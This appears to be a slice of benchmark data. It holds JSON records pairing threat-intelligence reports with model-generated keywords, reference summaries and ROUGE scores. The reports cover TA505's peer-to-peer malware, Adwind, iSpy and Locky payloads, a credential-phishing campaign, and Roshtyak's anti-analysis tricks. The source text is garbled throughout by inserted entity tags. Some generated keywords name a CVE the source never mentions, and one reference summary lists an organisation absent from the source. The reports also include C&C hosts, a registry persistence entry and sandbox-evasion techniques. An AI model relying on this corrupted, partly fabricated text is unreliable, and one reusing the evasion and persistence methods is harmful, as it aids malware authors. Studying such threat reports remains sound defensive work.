BYTE Data[Size ] ; // [PERSON] Xored with same key used in the header packet ( XOR_Key)};As expected , each network command ( [LAW] Table [LAW] 2 ) adds a different set of information in the \u2018 Data \u2019 field of the above structure but most of the commands follow a similar format . For example , an \u2018 invitation \u2019 request ( [ORG] Command [DATE] ID [DATE] 1 ) has the structure : struct Node_Network_Invitation_Packet BYTE Invitation_ID[16 ] ; BYTE Node_Peer_Name[16 ] ; WORD Node_Binded_Port;};The sample supports a limited set of commands , which have as a primary role to exchange \u2018 records \u2019 between each other . Command ID Description123456789Requests to register in the other nodes ( \u2018 invitation \u2019 request)Adds node IP to the probes listSends a ping request . It includes number of active connections and recordsSends number of active connections and records in the nodeAdds a new node IP : Port that the remote node will checkSends a record ID along with the number of data blocksRequests metadata of a recordSends metadata of a recordRequests the data of a record10Receives data of a record and store them on diskTable 2 \u2013 Set of command IDsANALYST NOTE : When information , such as record IDs or number of active connections / records , is sent , the binary adds the length of the data followed by the actual data . For example , in case of sending number of active connections and records:01 [DATE] 05 [DATE] 01 [DATE] 02 [DATE] 01 02The above is translated as:2 active connections from a total of [CARDINAL] 5 with [CARDINAL] 2 records . Moreover , when a node receives a request , it sends an echo reply ( includes the same packet header ) to acknowledge that the request was read . In general , the following types are supported : Request type of [CARDINAL] 0x10 for echo request . Request type of [DATE] 0x07 when sending data , which fit in [CARDINAL] one packet . Request type of 0xD when sending data in multiple packets ( size of payload over [DATE] 1419 bytes ) . Request type 0x21 . It exists in the binary but not supported during the network communications . Record files As mentioned already , a record has its own sub - folder under the \u2018 node \u2019 folder with each sub - folder containing the below files : m \u2013 Metadata of record file4/5l \u2013 Unknown purpose p \u2013 Payload dataThe metadata file contains a set of information for the record such as the node peer name and the node network ID . Among this information , the keys \u2018 tag \u2019 and \u2018 pwd \u2019 appear to be very important too . The \u2018 tag \u2019 key represents a command ( different from table [CARDINAL] 2 set ) that the node will execute once it receives the record . Currently , the binary only supports the command \u2018 updates \u2019 . The payload file ( p ) keeps the updated content encrypted with the value of key \u2018 pwd \u2019 being the [ORG] AES key . Even though we have not been able yet to capture any network traffic for the above command , we believe that it is used to update the current running core module . IoCsNodes \u2019 IPs 45.142.213[.]139:555195.123.246[.]14:55545.129.137[.]237:3396478.128.112[.]139:33964145.239.85[.]6:3333BinariesSHA-1DescriptionA21D19EB9A90C6B579BCE8017769F6F58F9DADB1 P2P Binary2F60DE5091AB3A0CE5C8F1A27526EFBA2AD9A5A7P2P [NORP] Binary2D694840C0159387482DC9D7E59217CF1E365027P2P Binary02FFD81484BB92B5689A39ABD2A34D833D655266x86 DriverB4A9ABCAAADD80F0584C79939E79F07CBDD49657x64 Driver00B5EBE5E747A842DEC9B3F14F4751452628F1FEX64 Driver22F8704B74CE493C01E61EF31A9E177185852437DownloaderD1B36C9631BCB391BC97A507A92BCE90F687440ADownloaderReferencesTable [CARDINAL] 3 \u2013 Binaries hashes1 . url", "generated_text": "a remote; command; control; a RAT; TA505; 2014; a partnership; EvilCorp; a ransomware; 2017; 2018; malicious binary files; a peer-to-peer network; the network; firmware; network IDs; the developer; Grace; the malware; the network; the malware; a keylogger; P2P; a GET; a P2P server; a network; the network; the victim; transfers; the ransomware; lateral movement; tactics; the attacks; access; lateral movement; targets.", "ref_text": "<START-1>The PDF describes research by NCC Group tracking a peer-to-peer (P2P) network used by the threat actor TA505, known for distribution of banking trojans and ransomware. The P2P network includes a downloader, signed driver, and node tool that communicate via UDP. The node tool exchanges records between peers. The programming style matches that of the GraceRAT malware used by TA505. The downloader fetches the other components from a command and control server, decrypts them, and installs them. The signed driver filters system information to avoid detection, injects the node tool payload, and reports back to the C2. The node tool communicates with other peers to exchange records containing metadata and encrypted payloads. The records appear to be used to distribute updates. While no interaction with GraceRAT was observed, the attribution to GraceRAT developers is based on code similarities. The research provides indicators of compromise on the components and notes that TA505 has shifted focus to ransomware operations for financial gain. The P2P network allows TA505 to distribute tools and updates while avoiding centralized infrastructure that could be taken down. The tools evolve but TA505 continues to pose a threat by compromising corporate networks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4471744471744472, "gpt3/lexical/rouge_rouge2": 0.12345679012345678, "gpt3/lexical/rouge_rougeL": 0.22113022113022113, "gpt3/lexical/rouge_rougeLsum": 0.22113022113022113, "gpt3_generated_text": ["This article discusses the tracking of a peer-to-peer (P2P) network related to the threat actor group TA505. The researchers have identified binary files that are attributed to the developer(s) of a malware called 'Grace' or 'FlawedGrace'. These binary files include a remote administration tool (RAT) exclusively used by TA505. The researchers have found that the identified binary files are capable of communicating with each other through a P2P network via UDP. Although there is no direct interaction between the identified samples and a host infected by 'Grace', there is a medium to high confidence that there is a connection between the developer(s) of 'Grace' and the identified binaries. The article also provides a history of TA505's shift to ransomware operations, starting from their emergence as a group in 2014 and their split from a partnership with EvilCorp in 2017. The article further explores the use of different malware tools by TA505, including 'Clop', 'SDBBot', and 'ServHelper', and highlights the group's realization of the potential of ransomware operations as a viable business model. The researchers delve into the technical details of the P2P network, including the use of network IDs, and discuss the tactics used by TA505, such as lateral movement and targeted attacks on financial institutions."]}, {"split_name": "val", "sample_id": "val_94", "prompt_text": "Extract the keywords: Targeted Attack Campaigns with Multi - Variate Malware Observed in the Cloudnetskope.com/blog/targeted-attack-campaigns-multi-variate-malware-observed-cloudAbhinav SinghMarch 8 , 2017This website uses cookies We use cookies to personalise content and ads , to provide social media features and to analyse traf\ufb01c . We also share information about your use of our site with our social media , advertising and analytics partners who may combine it with other information that you \u2019ve provided to them or that they \u2019ve collected from your use of their services . To opt - in , select ok , otherwise select settings to set opt - out preferences . OK Show detailsThis website uses cookies for advertising and analytics purposes as described in our cookie policy . For more information and to set preferences , please click here . By continuing to browse this website , you accept our use of cookies.\u00d7url Attack Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeNetskope Threat Research Labs has observed ongoing targeted attacks in enterprise cloud environments that lead to a malware fan - out effect through automated syncing and sharing of \ufb01les in the cloud . While monitoring this attack , we captured several instances where the synced \ufb01lenames were similar to the email addresses of the attack victims . These attachments are often automatically synced to cloud storage applications using \ufb01le collaboration settings in popular SaaS applications like Of\ufb01ce365 , Google mail etc . This auto - syncing feature can also be achieved through [ORDINAL] third party applications as well . Since the \ufb01lenames appear less suspicious , they are more likely to be viewed as coming from within the organization ( and therefore trusted ) and shared with others in the same user group . Figure [CARDINAL] 1 illustrates this effect in a cloud environment and how [GPE] Netskope detects the attack patterns at various stages . Figure [CARDINAL] 1 : Infection propagation in [ORG] the [ORG] Cloudurl [ORG] Attack [ORG] Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeThe synced \ufb01les were all zipped and contained obfuscated JavaScript . Over the course of this campaign , [ORG] Netskope [ORG] Threat [ORG] Protection detected variations in both zipped [ORG] JavaScript as well as the \ufb01nal payload that would be delivered once the [ORG] JavaScript was executed . Changes in JavaScript were limited to varying obfuscation techniques , but there were [CARDINAL] three variations in \ufb01nal payload over the course of time . The payload \u2019s variations were associated with keyloggers , remote access trojans , and more importantly , ransomware . Some of these samples would disable endpoint antivirus software , leaving the enterprise to rely on a remote scan engine like [ORG] Netskope [ORG] Threat [ORG] Protection . Consider the example recipient as joey.tribbiani@example.com , we noticed following variations in attachment names for the targeted emails : Joey.tribbiani[0 - 9A - Z]{6,8}_[0 - 9A - F]{6,8}.zipJoey.trbbiani_proposal_[0 - 9A - F]{6}.zipPdf_letter - joey.tribbiani_[0 - 9A - F]{6}.zip [PERSON] Attack [PERSON] Vector The attack vector follows the usual infection pattern in which the attached zip \ufb01le contains an obfuscated JavaScript . We have noticed variations in the wrapper JavaScript indicating that the attackers were attempting multiple ways to circumvent the corporate environment . [ORG] Netskope [ORG] Threat [ORG] Protection detects the attached zip \ufb01le and obfuscated [ORG] JavaScript inside as Gen. [PERSON] Downloadrs . B1F4C42E , Gen. Downloadrs.10CC4FE0 and [ORG] Generic . JS.DownloaderS.B1F4C42E respectively . Obfuscated JavaScripts During our investigation , we observed [CARDINAL] two variations of the obfuscated JavaScript that were delivered as zip attachments to the recipients . [ORG] First [ORG] Variation is shown in Figure [CARDINAL] 2.url Attack Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeFigure 2 : Simpli\ufb01ed version of the obfuscated wrapper JavaScript . The above [PRODUCT] JavaScript creates a Windows script host object to establish connection with the hard- coded url ( [PERSON] astralopitec[.]yomu[.]ru ) in object named \u201c dingy \u201d . The fetched malware payload is then stored in the % TEMP% directory . Second Variation with domains hosting the payloads . The box in \ufb01gure [CARDINAL] 3 shows the fully constructed domain names once the script is completely deobfuscated . The dropped payload is again saved with a random name in the % TEMP% directory . Payload Variations We noticed [CARDINAL] three different variations in the payloads delivered using the obfuscated JavaScript . These payloads belong to Adwind RAT , [ORG] iSpy keylogger and [GPE] Locky ransomware families detected by [ORG] Netskope [ORG] Threat protection as [ORG] Backdoor . [PERSON] Generckd.3312003 , [PERSON] Gen : Variant . Rzy.73941 and [ORG] Backdoor . Agnt . CDQB . Payload Variation 1 : Adwind RAT Netskope detection : Backdoor . Generckd.3312003The \ufb01rst payload that we encountered while tracking this campaign was an instance of cross- platform , [PERSON] Java based Adwind RAT , which has the capability to infect [PRODUCT] Windows , Linux and Macs as shown in Figure [CARDINAL] 4.url Attack Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeFigure 4 : [ORG] Excerpt of decompiled Jar of Adwind RATThe RAT has the capability to launch a shell connectivity giving backdoor access to the attacker and has basic \ufb01le stealing features . Figure [CARDINAL] 5 below shows the class \ufb01les which form the crux of the RATs capabilities.url Attack Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeFigure 5 : Adwind RAT capabilities de\ufb01ned in the decompiled codeUpon execution on a typical windows environment , the [ORG] RAT will create a random user pro\ufb01le and will attempt to create persistence by registering an entry into HKCU Run key:\u201creg.exe \u201d ( Access type : \u201c SETVAL \u201d ; Path : \u201c HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN \u201d ; Key : \u201c HP \u201d ; Value : \u201c \u201d % APPDATA%\\Oracle\\bin\\javaw.exe \u201d -jar \u201c % USERPROFILE%\\QI\\giwauQII.cvLwffAX\u201d\u201d)The jar \ufb01le constructs multiple VB scripts onto the disk , which are executed by launching an instance of command prompt . These visual basic scripts creates [ORG] WMI command line queries and checks for system information like anti - virus programs , \ufb01rewall settings etc . A snapshot of the scripts is shown in \ufb01gure [CARDINAL] 6 . Adwind also copies relevant [PERSON] Java [PERSON] Runtime \ufb01les to [ORG] Appdata using xcopy command . Figure [CARDINAL] 6 : VB scripts created by the [ORG] RAT to gather system informationThe sample tried connecting to a dynamic dns domain , securitypoint[.]ddns[.]net . Hosting [ORG] C&C servers on dynamic [ORG] DNS services helps attackers in quickly switching their [ORG] IPs without changing the host . [ORG] Payload [ORG] Variation [ORG] 2 : [ORG] iSpy Keylogger Netskope detection : Gen : Variant . Rzy.73941The next instance of malware was observed to be the popular [ORG] iSpy keylogger , which is sold in a subscription based model in underground forums . [ORG] iSpy is a .Net compiled keylogger that comes packed with loads of additional features like stealing browser history , webcam logging , keystroke recording , clipboard monitoring etc . Figure [CARDINAL] 7 shows the captured strings in memory when the keylogger is installed onto the system.url Attack Campaigns with Multi - Variate Malware Observed in the Cloud - Netskopeurl Attack Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeFigure 7 : [ORG] iSpy keylogger activities captured in memory stringsUpon execution , the malware creates a copy of itself in \\App [PRODUCT] Data\\Roaming\\Microsoft\\Windows\\ScreenToGif . The malware maintains persistence by creating registry entries in [ORG] HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Cache . The entry is made to invoke a payload activator executable that checks for running instances of the main [ORG] iSpy payload based on the mutex . If the malware is not already loaded in the memory , It will launch its new instance . The payload loader is stored in the % TEMP% directory . Parts of the decompiled code can be seen in Figure 8.Figure 8 : Payload loader \u2019s decompiled codeThe code will look for running instance of process named \u201c netprotocol \u201d and sleeps if it is already loaded into the memory . It will spun up a new process by invoking the copy of malware stored in the [ORG] ScreenToGif folder . Apart from the keylogging and information stealing features , [ORG] iSpy also makes sure that it disables any known running instances of a wide variety of anti - virus programs onto the system as shown in Figure [CARDINAL] 9.Figure 9 : Process names of anti - virus solutions targeted by [ORG] iSpy keyloggerThe bene\ufb01t of using a cloud security solution like [GPE] Netskope is that they are not affected by such counter - measures implemented by sophisticated malware.url [ORG] Attack [ORG] Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeThe malware stores the ex\ufb01ltrated data in a \ufb01le in the % TEMP% directory and sends the harvested data to the [ORG] C&C , westech - solar[.]co . At the time of analysis , the [ORG] C&C was unresponsive . Payload Variation 3 : Variant of [ORG] Locky / [ORG] Zepto Sample hash : [CARDINAL] 6968F0AF128C27C6C970ADC0B301D204 Netskope detection : [ORG] Backdoor . [GPE] Agnt . CDQBThe [ORDINAL] third and last payload noticed during our monitoring , belongs to [GPE] Locky ransomware family . We observed a variant of [GPE] Locky being delivered as the \ufb01nal payload once the user executes the attached JavaScript . We have blogged about a detailed analysis of the variant [PERSON] Zepto here . The samples noticed during this campaign were no different from the one we disclosed in our blog . There were slight variations in the \ufb01rst level JavaScript where the payload execution parameters were slightly obfuscated . Figure [CARDINAL] 10 : Ransom message from [ORG] Locky / [ORG] Zepto [ORG] Conclusion [ORG] Sending malicious attachments through emails is not new , but remains a very popular method for delivering targeted attacks . By crafting an attack vector that leaves little for many existing enterprise security solutions , it becomes easy for attackers to infect users and network . Organizations using cloud storage apps further amplify the attack vector when the malicious \ufb01les and payloads is synced across multiple users . General recommendations [GPE] Netskope recommends following course of actions to effectively counter such threats : Detect and remediate all threats at rest in sanctioned cloud services using a threat - aware Cloud Access Security Broker like [GPE] Netskope . Detect and remediate all threats being downloaded from unsanctioned cloud services using a threat - aware solution like Netskope.url Attack Campaigns with Multi - Variate Malware Observed in the Cloud - NetskopeScan \ufb01les using remote scanning services like [ORG] Netskope [ORG] Advanced [ORG] Threat [ORG] Protection , that can not be disabled by malware . [PERSON] Regularly back up and turn on versioning for critical content in cloud services . Avoid opening email attachments if it appears to be coming from unknown sources . Disable automatic unzipping of \ufb01les and avoid clicking on any JavaScript that comes as zipped archive unless fully veri\ufb01ed by the sender or IT administrator . Actively track usage of unsanctioned cloud services and enforce DLP policies to control \ufb01les and data entering and leaving your corporate environment . Keep systems and antivirus updated with the latest releases and patches . Contact Us We 'd love to hear from you!url", "generated_text": "threat research; Netskope; activity; email; attachments; attachment names; the attack vector; obfuscated JavaScript; files; the files; the attackers; multiple ways; the corporate environment; the zipped JavaScript; the payload; keyloggers; remote access trojans; ransomware; keystrokes; other cloud environments; the cloud; the attacks; multiple modes; the attackers; the cloud; each mode; the same user group; the malware; the files; the email addresses; Use; a variety; the final payload; the payload; keyloggers; remote access; ransomware; a remote scan engine; Netskope Threat Protection; the entire cloud; a targeted attack campaign; multiple variants; the attacks; nature.", "ref_text": "<START-1>The PDF discusses targeted cyberattack campaigns that Netskope Threat Research Labs observed in enterprise cloud environments. The attacks involved sending emails with zipped JavaScript attachments that would sync and share themselves via cloud storage apps. File names resembled recipients' email addresses to appear more legitimate when shared. The JavaScript attachments contained varying obfuscation techniques but ultimately dropped a remote access trojan, keylogger, or ransomware payload on the victim's system. Payloads included Adwind RAT, iSpy keylogger, and Locky ransomware variants. The automated file sharing spread the infection rapidly in the cloud. Netskope detected the attacks at multiple stages, including the initial zipped JavaScript attachment, obfuscated code, and final payload. The JavaScript exploited Windows Script Host to download the malicious payload and used domain generation algorithms to avoid blocking. Payloads employed anti-virus evasion and remote scanning resistance. To counter such threats, Netskope recommends detecting and remediating malware in sanctioned cloud apps, blocking unsanctioned cloud access, using remote file scanning, backing up critical data, avoiding suspicious attachments, tracking risky cloud usage, updating systems/AV, and enforcing data policies. The layered defense highlights the importance of cloud-based security to cover the entire attack chain. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5, "gpt3/lexical/rouge_rouge2": 0.14965986394557823, "gpt3/lexical/rouge_rougeL": 0.2905405405405405, "gpt3/lexical/rouge_rougeLsum": 0.2905405405405405, "gpt3_generated_text": ["Netskope Threat Research Labs has observed targeted attack campaigns in enterprise cloud environments that involve the use of multi-variate malware. These attacks involve the automatic syncing and sharing of files in the cloud, with the file names often resembling the email addresses of the victims. The synced files are zipped and contain obfuscated JavaScript, with variations in both the JavaScript and the final payload. The payload variations include keyloggers, remote access trojans, and ransomware. The attackers attempt to circumvent the corporate environment by using different obfuscation techniques and delivery methods. Netskope Threat Protection detects and identifies these attacks in the cloud environment."]}, {"split_name": "val", "sample_id": "val_95", "prompt_text": "Extract the keywords: Cyber espionage campaign targets renewable energy [ORG] companiesbleepingcomputer.com/news/security/cyber-espionage-campaign-targets-renewable-energy-companiesBill ToulasJanuary 17 , [DATE] 2022A large - scale cyber - espionage campaign targeting primarily renewable energy and industrial technology organizations have been discovered to be active since [DATE] at [DATE] least [DATE] 2019 , targeting over [CARDINAL] fifteen entities worldwide . The campaign was discovered by security researcher [PERSON] William [PERSON] Thomas , a Curated [ORG] Intelligence trust group member , who employed OSINT ( open - source intelligence ) techniques like [ORG] DNS scans and public sandbox submissions . [PERSON] Thomas ' analysis revealed that the attacker uses a custom ' Mail Box ' toolkit , an unsophisticated phishing package deployed on the actors ' infrastructure , as well as legitimate websites compromised to host phishing pages . Most of the phishing pages were hosted on \" * .eu3[.]biz \" , \" * .eu3[.]org \" , and \" * .eu5[.]net \" domains , while the majority of the compromised sites are located in [GPE] Brazil ( \" * .com[.]br\").Targeting the renewable energy sector1/4The phishing campaign 's goal is to steal the login credentials of those working for renewable energy firms , environmental protection organizations , and industrial technology in general . Examples of organizations targeted by the phishing attacks include : [ORG] Schneider [ORG] Electric [ORG] University [ORG] of [ORG] Wisconsin [ORG] California [ORG] State [ORG] University [ORG] Utah [ORG] State [ORG] University Kardzhali Hydroelectric Power Station ( [GPE] Bulgaria ) [ORG] CEZ [ORG] Electro ( [GPE] Bulgaria ) [ORG] California [ORG] Air [ORG] Resources [ORG] Board [ORG] Morris [ORG] County [ORG] Municipal [ORG] Utilities [ORG] Authority [ORG] Taiwan [ORG] Forestry [ORG] Research [ORG] Institute Carbon Disclosure Program Sorema ( [NORP] Italian recycling firm)Phishing sites set up for stealing employee credentialsSource : blog.bushidotoken.netThe researcher could n't retrieve any samples of the phishing emails used in the campaign , but [PERSON] Thomas believes the emails used a \" Your Mail Box storage is full \" lure based on the landing pages . Unknown actor [PERSON] Thomas could n't attribute this campaign to any specific actors , but evidence points to [CARDINAL] two clusters of activity , [CARDINAL] one from [GPE] APT28 ( aka FancyBear ) and [CARDINAL] one from [GPE] Konni ( [GPE] North [GPE] Korea actors).Google [ORG] Threat [ORG] Analysis [ORG] Group researchers have recently found phishing activity attributed to [GPE] APT28 , which uses several \" eu3[.]biz \" domains.2/4Since mid - Dec , @Google TAG has detected ongoing [GPE] APT28 cred phishing campaigns targetingUkraine . Some IOCs : consumerpanel.eu3[.]biz consumerpanel.eu3[.]orgconsumerspanelsrv.eu3[.]orgprotectpanel.eu3[.]bizupdateservicecenter.blogspot[.]com \u2014 billy leonard ( @billyleonard ) [DATE] January [DATE] 14 , 2022An overlap point for both groups is that the hostnames used for phishing credentials are owned by [ORG] Zetta [ORG] Hosting [ORG] Solutions , a name that has appeared in many analyst reports recently . \"Konni \" used [ORG] Zetta [ORG] Hosting [ORG] Solution domains in the Diplomat - targeting campaign uncovered by [PERSON] Cluster25 , and also in a T406 ( [NORP] Korean hackers ) campaign analyzed by [GPE] Proofpoint . [PERSON] Thomas explained to [ORG] BleepingComputer that many [ORG] APT hacking groups use [GPE] Zetta in malicious campaigns . \"Zetta is used a lot by APTs and malware , and I 'd be very surprised if they did n't know . They 're not a huge company . Threat actors also like these types of free hostname services where they can setup infrastructure quickly , freely , and anonymously . \" - Thomas . However , the researcher underlined that he does n't have proof or concrete evidence that [PERSON] Zetta [PERSON] Hosting is knowingly helping malicious campaigns . Focus on [GPE] Bulgaria and potential motive Apart from the [CARDINAL] two entities mentioned in the victimology section above , the researcher has noticed a small cluster of activity from [DATE] 2019 linked to the same infrastructure targeting multiple [NORP] Bulgarian banks . Phishing URLs targeting [NORP] Bulgarian banksSource : blog.bushidotoken.netThe researcher believes that the adversary is financially supported by entities interested in fossil fuels , particularly someone selling energy to [GPE] Bulgaria who sees renewables as a threat . The previous targeting of banks could be an attempt to gather intelligence on the funding and construction of new renewable energy facilities.3/4APT28 is a [NORP] Russian group linked to the state , and [GPE] Bulgaria is known to import significant amounts of [NORP] Russian natural gas , so the link between this campaign and the particular actors has a logical basis , even if it 's not proven at this point.4/4", "generated_text": "PDF; cyber espionage; organizations; the renewable energy sector; 2019; the malware; phishing pages;.eu3[.]biz;.eu3[.]org;.eu5[.]net; Brazil; the attacker; APT28; Konni; North Korea; the phishing emails; the emails; a lure; the landing pages; the phishing emails; the CVE-2019-0229; the attacker; the campaign; the initial access; the phishing emails; credentials; the campaign; the payload; The attacker; a custom phishing package; the actors; the infrastructure; the phishing pages; the emails; the actors; legitimate websites; the compromised sites; Brazil; the research; IP addresses; the events; the attacker; the Campaign; exes; a new cyber espionage campaign; the renewable energy sector.", "ref_text": "<START-1>The PDF describes a large-scale cyberespionage campaign targeting renewable energy and industrial technology organizations that has been active since at least 2019. The campaign was discovered by security researcher William Thomas using OSINT techniques. The attackers use a custom 'Mail Box' phishing toolkit and compromised websites, mainly in Brazil, to host phishing pages impersonating organisations in the renewable energy sector. The goal is to steal login credentials of employees at these firms. Over 15 entities worldwide have been targeted so far, including companies like Schneider Electric, Honeywell, universities, and renewable energy facilities. The researcher could not conclusively attribute the campaign to a specific threat actor but found possible links to APT28 and Konni groups. There is an overlap with infrastructure used by both groups. The campaign has a focus on Bulgaria, targeting several banks in 2019. The researcher speculates the adversary may be financially supported by fossil fuel interests who see renewable energy as a threat. The previous bank targeting could have been to gather intelligence on funding of new renewable facilities. While not proven, APT28's links to Russia provide a logical basis for this theory, as Bulgaria imports Russian natural gas. In summary, this ongoing cyberespionage campaign is targeting the renewable energy sector, likely to steal intelligence to benefit fossil fuel interests threatened by clean energy adoption. Attribution is unclear but tactics and infrastructure analysis suggests potential APT28 or Konni involvement. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.518324607329843, "gpt3/lexical/rouge_rouge2": 0.2210526315789474, "gpt3/lexical/rouge_rougeL": 0.3036649214659686, "gpt3/lexical/rouge_rougeLsum": 0.3036649214659686, "gpt3_generated_text": ["A new cyber espionage campaign targeting organizations in the renewable energy sector has been discovered since at least 2019. The campaign primarily uses phishing techniques to steal login credentials from employees of renewable energy firms, environmental protection organizations, and industrial technology companies. The attacker uses a custom phishing package and compromises legitimate websites to host phishing pages. The majority of the phishing pages are hosted on domains such as \"*.eu3[.]biz\" and \"*.eu5[.]net\", with many compromised sites located in Brazil. The campaign is believed to be carried out by two clusters of activity, possibly linked to APT28 (also known as FancyBear) and Konni (North Korean actors). The motive behind the campaign may be financially supported by entities interested in fossil fuels, particularly those selling energy to Bulgaria who view renewables as a threat. The campaign has targeted organizations worldwide, including universities, power stations, and environmental research institutes."]}, {"split_name": "val", "sample_id": "val_96", "prompt_text": "Extract the keywords: decoded.avast.io /janvojtesek / raspberry - robins - roshtyak - a - little - lesson - in - trickery/ [PERSON] Raspberry [PERSON] Robin [PERSON] \u2019s Roshtyak : A Little Lesson in Trickery \u22ee [PERSON] 9/22/2022by Jan Vojt\u011b\u0161ek [DATE] September 22 , [DATE] 2022 46 min readThere are various tricks malware authors use to make malware analysts \u2019 jobs more difficult . These tricks include obfuscation techniques to complicate reverse engineering , anti - sandbox techniques to evade sandboxes , packing to bypass static detection , and more . Countless deceptive tricks used by various malware strains in - the - wild have been documented over [DATE] the [DATE] years . However , few of these tricks are implemented in a typical piece of malware , despite the many available tricks . The subject of this blog post , a backdoor we dubbed Roshtyak , is not your typical piece of malware . Roshtyak is full of tricks . Some are well - known , and some we have never seen before . From a technical perspective , the lengths [PERSON] Roshtyak takes to protect itself are extremely interesting . Roshtyak belongs to one of the best - protected malware strains we have ever seen . We hope by publishing our research and analysis of the malware and its protection tricks we will help fellow researchers recognize and respond to similar tricks , and harden their analysis environments , making them more resistant to the evasion techniques described . Roshtyak is the [ORG] DLL backdoor used by [PERSON] Raspberry [PERSON] Robin , a worm spreading through infected removable drives . [PERSON] Raspberry [PERSON] Robin is extremely prevalent . We protected over 550 K of our users from the worm [DATE] this [DATE] year . Due to its high prevalence , it should be no surprise that we are n\u2019t the only ones taking note of [PERSON] Raspberry [PERSON] Robin . [ORG] Red [ORG] Canary [ORG] \u2019s researchers published the [ORDINAL] first analysis of [PERSON] Raspberry [PERSON] Robin in [DATE] May [DATE] 2022 . In [DATE] June , [ORG] Symantec published a report describing a mining / clipboard hijacking operation , which reportedly made the cybercriminals [MONEY] at [MONEY] least $ 1.7 [MONEY] million . Symantec did not link the malicious operation to [PERSON] Raspberry [PERSON] Robin . Nevertheless , we assess with high confidence that what they analyzed was [PERSON] Raspberry [PERSON] Robin . This assessment is based on [ORG] C&C overlaps , strong malware similarity , and coinfections observed in our telemetry . [PERSON] Cybereason , [ORG] Microsoft , and [GPE] Cisco published further reports in July / August [DATE] 2022 . [ORG] Microsoft reported that [PERSON] Raspberry [PERSON] Robin infections led to [ORG] DEV-0243 ( a.k.a [ORG] Evil [ORG] Corp ) pre - ransomware behavior . We could not confirm this connection using our telemetry . Still , we find it reasonable to believe that the miner payload is not the only way [PERSON] Raspberry [PERSON] Robin infections are being monetized . Other recent reports also hint at a possible connection between [PERSON] Raspberry [PERSON] Robin and [ORG] Evil [ORG] Corp. A map showing the number of users Avast protected from [PERSON] Raspberry [PERSON] RobinThere are many unknowns about [PERSON] Raspberry [PERSON] Robin , despite so many published reports . What are the ultimate objectives behind the malware ? Who is responsible for [PERSON] Raspberry [PERSON] Robin ? How did it become so prevalent?1/16Unfortunately , we do not have answers to all these questions . However , we can answer an important question we saw asked multiple times : What functionality is hidden inside the heavily obfuscated [ORG] DLL ( or [PERSON] Roshtyak as we call it ) ? To answer this question , we fully reverse engineered a [PERSON] Roshtyak sample , and present our analysis results in this blog post . [ORG] OverviewRoshtyak is packed in [CARDINAL] as [CARDINAL] many [CARDINAL] as [CARDINAL] 14 protective layers , each heavily obfuscated and serving a specific purpose . Some artifacts suggest the layers were originally [ORG] PE files but were transformed into custom encrypted structures that only the previous layers know how to decrypt and load . Numerous anti - debugger , anti - sandbox , anti - VM , and anti- emulator checks are sprinkled throughout the layers . If [CARDINAL] one of these checks successfully detects an analysis environment , [CARDINAL] one of [CARDINAL] four actions are taken.1 . The malware calls [ORG] TerminateProcess on itself to avoid exhibiting any further malicious behavior and to keepthe subsequent layers encrypted.2 . Roshtyak crashes on purpose . This has the same effect as terminating itself , but it might not be immediatelyclear if the crash was intentional or because of a bug thanks to Roshtyak \u2019s obfuscated [CARDINAL] nature.3 . The malware enters an infinite loop on purpose . Since the loop itself is located in obfuscated code and spansthousands of instructions , it might be hard to determine if the loop is doing something useful or [GPE] not.4 . The most interesting case is when the malware reacts to a successful check by unpacking and loading a fake payload . This happens in the [ORDINAL] eighth layer , which is loaded with [CARDINAL] dozens of anti - analysis checks . The result of each of these checks is used to modify the value of a global variable . There are [CARDINAL] two payloads encrypted in the data section of the [ORDINAL] eighth layer : the real ninth layer and a fake payload . The real [ORDINAL] ninth layer will get decrypted only if the global variable matches the expected value after all the checks have been performed . If [CARDINAL] at [CARDINAL] least [CARDINAL] one check succeeded in detecting an analysis environment , the global variable \u2019s value will differ from the expected value , causing Roshtyak to unpack and execute the fake payload instead . Roshtyak \u2019s obfuscation causes even relatively simple functions to grow into large proportions . This necessitates some custom deobfuscation tooling if one wants to reverse engineer it within a reasonable timeframe . The fake payload is a [ORG] BroAssist ( a.k.a [ORG] BrowserAssistant ) adware sample . We believe this fake payload was intended to mislead malware analysts into thinking the sample is less interesting than it really is . When a reverse engineer focuses on quickly unpacking a sample , it might look like the whole sample is \u201c just \u201d an obfuscated piece of adware ( and a very old one at that ) , which could cause the analyst to lose interest in digging deeper . And indeed , it turns out that these fake payload shenanigans can be very effective . As can be seen on the screenshot below , it fooled [CARDINAL] at [CARDINAL] least [CARDINAL] one researcher , who misattributed the [PERSON] Raspberry [PERSON] Robin worm , because of the fake [ORG] BrowserAssistant payload.2/16A security researcher misattributing [PERSON] Raspberry [PERSON] Robin because of the fake payload . This is not to pick on anyone , we just want to show make a mistake like this given Roshtyak \u2019s trickery and complexity . The Bag of TricksFor the sake of keeping this blog post ( sort of ) short and to the point , let [NORP] \u2019s get straight into detailing some of the more interesting evasion techniques employed by Roshtyak . Segment registersEarly in the execution , Roshtyak prefers to use checks that do not require calling any imported functions . If [CARDINAL] one of these checks is successful , the sample can quietly exit without generating any suspicious API calls . Below is an example where Roshtyak checks the behavior of the gs segment register . The check is designed to be stealthy and the surrounding garbage instructions make it easy to overlook . A stealthy detection of single- stepping . Only the underscored instructions are useful . The [ORDINAL] first idea behind this check is to detect single - stepping . Before the above snippet , the value of cx was initialized to [CARDINAL] 2 . After the pop ecx instruction , [PERSON] Roshtyak checks if cx is still equal to [CARDINAL] 2 . This would be the expected behavior because this value should propagate through the stack and the gs register under normal circumstances . However , a single step event would reset the value of the gs selector , which would result in a different value getting popped into ecx at the end . But there is more to this check . As a side effect of the [CARDINAL] two push / pop pairs above , the value of gs is temporarily changed to [CARDINAL] 2 . After this check , [PERSON] Roshtyak enters a loop , counting the number of iterations until the value of gs is no longer [CARDINAL] 2 . The gs selector is also reset after a thread context switch , so the loop essentially counts the number of iterations until a context switch happens . Roshtyak 